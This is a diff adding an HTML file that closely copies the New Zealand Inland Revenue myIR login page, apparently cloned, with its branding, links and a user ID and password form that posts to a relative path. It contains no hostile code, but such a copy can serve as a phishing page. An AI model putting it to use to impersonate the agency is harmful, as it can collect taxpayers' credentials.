@@ -1,0 +1,129 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+    <link rel="stylesheet" href="ir.css">
+    <title>ir</title>
+</head>
+
+<body>
+
+
+    <header>
+        <nav>
+            <div class="bg-dark navigation">
+                <div class="d-flex">
+                    <div class="container ml-auto mr-auto nav-links">
+                        <div class="nav-left">
+                            <span class="">Welcome to Inland Revenue's Secure Online Services</span>
+                        </div>
+                        <div class="nav-right">
+                            <a href="https://www.ird.govt.nz/" tabindex="11">Inland Revenue homepage</a>
+                            <span style="margin: 0px 5px">|</span>
+                            <a href="http://www.ird.govt.nz/contact-us/" tabindex="12" target="_blank">Contact us</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="bg-primary nav-banner">
+                <div class="d-flex">
+                    <div class="container ml-auto mr-auto">
+                        <div class="nav-banner-block">
+                            <img src="/irsso/resources/img/logo-myir-lg.png" class="logo-myir"><span class="banner-text">Login to myIR</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <main role="main" class="container ml-auto mr-auto">
+
+        <div class="row justify-content-center body-head"></div>
+
+        <div class="row justify-content-center">
+            <div class="card card-350">
+                <div class="card-body">
+                    <form action="/oam/server/auth_cred_submit" method="post" autocomplete="off">
+                        <input type="hidden" id="request_id" name="request_id" value="370889066160608342">
+
+                        <div class="form-group">
+                            <div class="float-right">
+                                <a href="https://myir.ird.govt.nz/eservices/home/?link=forgotlogon" tabindex="4">Forgot
+                                    user ID?</a>
+                            </div>
+                            <label for="userid">myIR user ID</label>
+                            <input type="text" class="form-control login-input box-shadow" id="userid" name="userid" tabindex="1" maxlength="256" autocomplete="false">
+                        </div>
+
+                        <div class="form-group">
+                            <div class="float-right">
+                                <a href="https://myir.ird.govt.nz/eservices/home/?link=forgotpassword" tabindex="5">Forgot password?</a>
+                            </div>
+                            <label for="password">Password</label>
+                            <input type="password" class="form-control login-input box-shadow" id="password" name="password" tabindex="2" maxlength="256" autocomplete="false">
+                        </div>
+
+                        <div class="form-button">
+                            <button type="submit" class="btn btn-primary button-shadow login-button" tabindex="3">Login</button>
+                        </div>
+
+                        <div class="link-group">
+                            <a href="https://myir.ird.govt.nz/eservices/home/?link=NEWLOGUNA" tabindex="6">Not yet
+                                registered?</a> <span class="spacer-pipe">|</span> <a href="http://www.ird.govt.nz/help/site-use/online-cantgetthrough.html" tabindex="7" target="_blank">Help logging in</a>
+                        </div>
+                    </form>
+                </div>
+                <div class="card-footer" href="javascript:void(0);" onclick="window.location.href='/irsso/realmelogin.jsp'" tabindex="8">
+                    <img class="realme-icon" src="/irsso/resources/img/logo-realme.png"><span>Login with
+                        RealMe</span><img class="realme-external" src="/irsso/resources/img/icon-new-window-white.png"><img class="realme-padlock" src="/irsso/resources/img/icon-padlock.png">
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <div style="display: none;">
+        <img src="https://myir.ird.govt.nz/logout.gif?202008261724164"><img src="https://myir.ird.govt.nz/oam_logout_success?202008261724164"><img src="https://www1.e-services.ird.govt.nz/logout.gif?202008261724164"><img src="https://www1.e-services.ird.govt.nz/oam_logout_success?202008261724164">
+        <img src="https://www2.e-services.ird.govt.nz/logout.gif?202008261724164"><img src="https://www2.e-services.ird.govt.nz/oam_logout_success?202008261724164">
+    </div>
+
+
+
+    <footer class="footer">
+        <div class="container ml-auto mr-auto">
+            <div class="d-flex flex-wrap footer-links">
+                <div class="footer-left">
+                    <p class="footer-nav-links"><a href="https://www.ird.govt.nz/">Inland Revenue homepage</a><span class="spacer-pipe">|</span><a href="http://www.ird.govt.nz/contact-us/">Contact Us</a></p>
+                    <p>© <a href="https://www.ird.govt.nz/about-this-site/conditions/#01" target="_blank">Copyright
+                            2019</a> Inland Revenue. </p>
+                    <p class="footer-conditions-link"><a href="https://www.ird.govt.nz/about-this-site/conditions/" target="_blank">Conditions of use</a></p>
+                </div>
+                <div class="ml-auto footer-right">
+                    <p>For more info on government services go to </p>
+                    <p>
+                        <a href="https://www.govt.nz/" tabindex="17"><img class="logo-NZGovt-link" src="/irsso/resources/img/New_Zealand_Government_logo.svg"></a>
+                    </p>
+                </div>
+            </div>
+        </div>
+
+
+    </footer>
+
+
+
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+</body>
+
+</html>
